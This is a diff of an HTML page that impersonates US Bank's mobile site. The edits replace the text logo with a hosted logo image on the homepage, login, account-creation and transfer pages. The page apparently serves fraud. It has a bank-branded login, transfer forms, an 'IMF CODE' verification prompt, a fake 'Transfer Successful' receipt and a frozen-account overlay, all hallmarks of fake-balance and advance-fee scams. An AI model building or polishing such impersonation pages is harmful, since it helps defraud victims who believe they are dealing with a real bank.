@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>US Bank</title>
+    <title>US Home</title>
     <meta property="og:title" content="US Bank">
     <meta property="og:description" content="Log in to your US Bank account securely.">
     <meta property="og:image" content="https://i.ibb.co/BKLK3cr2/BF917-E7-F-55-C6-47-B5-B682-18-D0-F4958937.jpg">
@@ -29,7 +29,7 @@
         }
         body { 
             font-family: var(--font-family); 
-            display: block; /* Removed flex to allow full width */
+            display: block;
         }
         
         /* APP CONTAINER - NOW 100% WIDTH */
@@ -50,9 +50,10 @@
         .navbar { background-color: #ffffff; display: flex; justify-content: space-between; align-items: center; padding: 12px 16px; width: 100%; position: sticky; top: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.05); box-sizing: border-box; }
         .hamburger { display: flex; flex-direction: column; gap: 4px; cursor: pointer; }
         .hamburger span { display: block; width: 22px; height: 2px; background-color: #555; }
-        .logo { display: flex; align-items: center; font-size: 24px; font-weight: 700; letter-spacing: -1px; }
-        .logo-us { background-color: var(--usbank-red); color: white; padding: 0px 4px; border-radius: 4px 4px 10px 10px; margin-right: 2px; font-size: 20px; line-height: 1.2; }
-        .logo-bank { color: var(--usbank-blue); font-size: 26px; }
+        
+        /* LOGO IMAGE - BLEND MODE APPLIED TO LAP IN */
+        .logo img { height: 32px; width: auto; display: block; mix-blend-mode: multiply; }
+        
         .login-btn { color: #0056b3; text-decoration: none; font-weight: 600; font-size: 16px; cursor: pointer; }
         
         /* HOMEPAGE */
@@ -138,11 +139,15 @@
         .transaction-amount { font-size: 16px; font-weight: 600; color: #333; }
         .amount-deposit { color: #22c55e !important; }
 
-        /* TRANSFER & PAY (FIXED TO SCROLL ALL THE WAY DOWN) */
+        /* TRANSFER & PAY */
         #tab-pay-transfer { height: 100%; display: flex; flex-direction: column; overflow: hidden; width: 100%; }
         .transfer-page-bg { background-color: var(--usbank-red); flex: 1; display: flex; flex-direction: column; overflow-y: auto; -webkit-overflow-scrolling: touch; padding-bottom: 120px; width: 100%; }
+        
+        /* TRANSFER HEADER LOGO */
         .transfer-page-header { padding: 32px 20px 20px 20px; }
+        .transfer-page-header img { height: 40px; margin-bottom: 15px; display: block; mix-blend-mode: multiply; }
         .transfer-page-title { font-size: 32px; font-weight: 400; color: #ffffff; }
+        
         .tf-card { display: flex; align-items: center; background-color: #ffffff; padding: 20px; border-radius: 16px; margin: 0 20px 16px 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); cursor: pointer; }
         .tf-icon-bg { width: 50px; height: 50px; background-color: #fce8e8; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-right: 16px; flex-shrink: 0; }
         .tf-icon-bg svg { width: 24px; height: 24px; fill: var(--usbank-red); }
@@ -153,10 +158,14 @@
         .tf-info p { font-size: 13px; color: #666; }
         .tf-chevron { color: #ccc; font-size: 26px; }
 
-        /* TRANSFER FORMS (FIXED FOR SCROLLING TO SEND BUTTON) */
+        /* TRANSFER FORMS */
         .form-page { background-color: #ffffff; flex: 1; display: flex; flex-direction: column; overflow-y: auto; -webkit-overflow-scrolling: touch; padding-bottom: 180px; width: 100%; }
+        
+        /* FORM HEADER LOGO */
         .form-page-header { padding: 16px 20px; border-bottom: 1px solid #eee; display: flex; align-items: center; position: sticky; top: 0; background-color: #fff; z-index: 50; width: 100%; box-sizing: border-box; }
-        .form-page-title { font-size: 18px; font-weight: 600; color: var(--usbank-blue); }
+        .form-page-header img { height: 24px; margin-right: auto; mix-blend-mode: multiply; }
+        .form-page-title { font-size: 18px; font-weight: 600; color: var(--usbank-blue); margin-left: 10px; }
+        
         .form-body { padding: 24px; width: 100%; box-sizing: border-box; }
         .form-section-title { font-size: 14px; font-weight: 700; color: var(--usbank-blue); margin: 20px 0 12px 0; padding-bottom: 4px; border-bottom: 1px solid #eee; }
         .form-section-title:first-child { margin-top: 0; }
@@ -169,7 +178,10 @@
         /* MODALS */
         .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.6); z-index: 2000; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .modal-box { background-color: #ffffff; width: 100%; max-width: 380px; border-radius: 16px; padding: 32px 24px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); max-height: 90vh; overflow-y: auto; -webkit-overflow-scrolling: touch; box-sizing: border-box; }
-        .modal-box .logo { justify-content: center; margin-bottom: 16px; }
+        
+        /* RECEIPT LOGO */
+        .receipt-logo { height: 35px; margin: 0 auto 16px auto; display: block; mix-blend-mode: multiply; }
+        
         .success-check { width: 60px; height: 60px; background-color: #e8f5e9; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 16px auto; }
         .success-check svg { width: 30px; height: 30px; fill: #2e7d32; }
         .modal-title { font-size: 20px; font-weight: 700; color: #333; margin-bottom: 4px; }
@@ -226,7 +238,7 @@
         <div id="main-page">
             <header class="navbar">
                 <div class="hamburger"><span></span><span></span><span></span></div>
-                <div class="logo"><span class="logo-us">us</span><span class="logo-bank">bank</span></div>
+                <div class="logo"><img src="https://i.ibb.co/Sw4RPZt4/IMG-7257.jpg" alt="US Bank"></div>
                 <a class="login-btn" onclick="showPage('login-page')">Log in</a>
             </header>
             <section class="hero">
@@ -259,7 +271,7 @@
         <div id="login-page" class="hidden">
             <header class="login-header">
                 <button class="back-btn" onclick="showPage('main-page')">&#8592;</button>
-                <div class="logo"><span class="logo-us">us</span><span class="logo-bank">bank</span></div>
+                <div class="logo"><img src="https://i.ibb.co/Sw4RPZt4/IMG-7257.jpg" alt="US Bank"></div>
             </header>
             <div class="form-container">
                 <div class="fdic-box">
@@ -291,7 +303,7 @@
         <div id="create-account-page" class="hidden">
             <header class="login-header">
                 <button class="back-btn" onclick="showPage('login-page')">&#8592;</button>
-                <div class="logo"><span class="logo-us">us</span><span class="logo-bank">bank</span></div>
+                <div class="logo"><img src="https://i.ibb.co/Sw4RPZt4/IMG-7257.jpg" alt="US Bank"></div>
             </header>
             <div class="form-container">
                 <h2 class="form-title">Create an account</h2>
@@ -360,7 +372,10 @@
 
             <div id="tab-pay-transfer" class="hidden">
                 <div class="transfer-page-bg">
-                    <div class="transfer-page-header"><h1 class="transfer-page-title">Transfer & Pay</h1></div>
+                    <div class="transfer-page-header">
+                        <img src="https://i.ibb.co/Sw4RPZt4/IMG-7257.jpg" alt="US Bank">
+                        <h1 class="transfer-page-title">Transfer & Pay</h1>
+                    </div>
                     <div class="tf-card" onclick="openTransferForm('usbank')"><div class="tf-icon-bg"><svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg></div><div class="tf-info"><h4>US Bank Accounts</h4><p>Instant internal transfer</p></div><div class="tf-chevron">&#8250;</div></div>
                     <div class="tf-card" onclick="openTransferForm('otherbank')"><div class="tf-icon-bg"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg></div><div class="tf-info"><h4>Transfer to Other Bank</h4><p>ACH & External accounts</p></div><div class="tf-chevron">&#8250;</div></div>
                     <div class="tf-card" onclick="openTransferForm('zelle')"><div class="tf-icon-bg zelle-icon"><svg viewBox="0 0 24 24"><path d="M7 6h10v2.5L10.5 16H17v2H7v-2.5L13.5 8H7V6z"/></svg></div><div class="tf-info"><h4>Zelle®</h4><p>Send money to friends</p></div><div class="tf-chevron">&#8250;</div></div>
@@ -369,7 +384,7 @@
             </div>
 
             <div id="form-usbank" class="form-page hidden">
-                <header class="form-page-header"><button class="back-btn" onclick="switchTab('pay-transfer')">&#8592;</button><div class="form-page-title">US Bank Transfer</div></header>
+                <header class="form-page-header"><button class="back-btn" onclick="switchTab('pay-transfer')">&#8592;</button><img src="https://i.ibb.co/Sw4RPZt4/IMG-7257.jpg" alt="US Bank"><div class="form-page-title">US Bank Transfer</div></header>
                 <div class="form-body"><form onsubmit="handleTransferSubmit(event, 'US Bank Account')">
                     <div class="input-field"><label>From Account</label><select class="account-select" id="us-from"></select></div>
                     <div class="input-field"><label>To Routing Number</label><input type="text" required pattern="\d{9}"></div>
@@ -379,7 +394,7 @@
                 </form></div>
             </div>
             <div id="form-otherbank" class="form-page hidden">
-                <header class="form-page-header"><button class="back-btn" onclick="switchTab('pay-transfer')">&#8592;</button><div class="form-page-title">Transfer to Other Bank</div></header>
+                <header class="form-page-header"><button class="back-btn" onclick="switchTab('pay-transfer')">&#8592;</button><img src="https://i.ibb.co/Sw4RPZt4/IMG-7257.jpg" alt="US Bank"><div class="form-page-title">Transfer to Other Bank</div></header>
                 <div class="form-body"><form onsubmit="handleTransferSubmit(event, 'Other Bank')">
                     <div class="input-field"><label>From Account</label><select class="account-select" id="ext-from"></select></div>
                     <div class="input-field"><label>Bank Name</label><input type="text" required></div>
@@ -391,7 +406,7 @@
                 </form></div>
             </div>
             <div id="form-zelle" class="form-page hidden">
-                <header class="form-page-header"><button class="back-btn" onclick="switchTab('pay-transfer')">&#8592;</button><div class="form-page-title">Zelle® Transfer</div></header>
+                <header class="form-page-header"><button class="back-btn" onclick="switchTab('pay-transfer')">&#8592;</button><img src="https://i.ibb.co/Sw4RPZt4/IMG-7257.jpg" alt="US Bank"><div class="form-page-title">Zelle® Transfer</div></header>
                 <div class="form-body"><form onsubmit="handleTransferSubmit(event, 'Zelle')">
                     <div class="input-field"><label>From Account</label><select class="account-select" id="zelle-from"></select></div>
                     <div class="input-field"><label>Recipient Email</label><input type="email" required></div>
@@ -401,7 +416,7 @@
                 </form></div>
             </div>
             <div id="form-wire" class="form-page hidden">
-                <header class="form-page-header"><button class="back-btn" onclick="switchTab('pay-transfer')">&#8592;</button><div class="form-page-title">Wire Transfer</div></header>
+                <header class="form-page-header"><button class="back-btn" onclick="switchTab('pay-transfer')">&#8592;</button><img src="https://i.ibb.co/Sw4RPZt4/IMG-7257.jpg" alt="US Bank"><div class="form-page-title">Wire Transfer</div></header>
                 <div class="form-body"><form onsubmit="handleTransferSubmit(event, 'Wire Transfer')">
                     <div class="form-section-title">Recipient Information</div>
                     <div class="input-field"><label>Recipient's Full Name</label><input type="text" required></div>
@@ -426,7 +441,10 @@
                 <div class="modal-box"><div class="auth-lock-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></div><h3>Verify Transaction</h3><p id="auth-prompt-text">Please enter your <strong>IMF CODE</strong> to proceed.</p><div class="input-field"><input type="text" id="input-imf-code" placeholder=""></div><button class="btn-verify" onclick="verifyAuthCode()">Verify</button><button class="btn-cancel" onclick="closeIMF()">Cancel</button></div>
             </div>
             <div id="receipt-modal" class="modal-overlay hidden">
-                <div class="modal-box"><div class="logo"><span class="logo-us">us</span><span class="logo-bank">bank</span></div><div class="success-check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><div class="modal-title">Transfer Successful</div><div class="modal-amount" id="receipt-amount">$0.00</div><div class="modal-details"><div class="modal-row"><span>Status</span><span style="color: #2e7d32;">Processed</span></div><div class="modal-row"><span>From</span><span id="receipt-from">-</span></div><div class="modal-row"><span>To</span><span id="receipt-to">-</span></div><div class="modal-row"><span>Ref No.</span><span id="receipt-ref">-</span></div><div class="modal-row"><span>Date</span><span id="receipt-date">-</span></div></div><button class="submit-btn" onclick="finishTransfer()">Done</button></div>
+                <div class="modal-box">
+                    <img src="https://i.ibb.co/Sw4RPZt4/IMG-7257.jpg" alt="US Bank" class="receipt-logo">
+                    <div class="success-check"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><div class="modal-title">Transfer Successful</div><div class="modal-amount" id="receipt-amount">$0.00</div><div class="modal-details"><div class="modal-row"><span>Status</span><span style="color: #2e7d32;">Processed</span></div><div class="modal-row"><span>From</span><span id="receipt-from">-</span></div><div class="modal-row"><span>To</span><span id="receipt-to">-</span></div><div class="modal-row"><span>Ref No.</span><span id="receipt-ref">-</span></div><div class="modal-row"><span>Date</span><span id="receipt-date">-</span></div></div><button class="submit-btn" onclick="finishTransfer()">Done</button>
+                </div>
             </div>
             
             <div id="frozen-overlay" class="modal-overlay hidden">
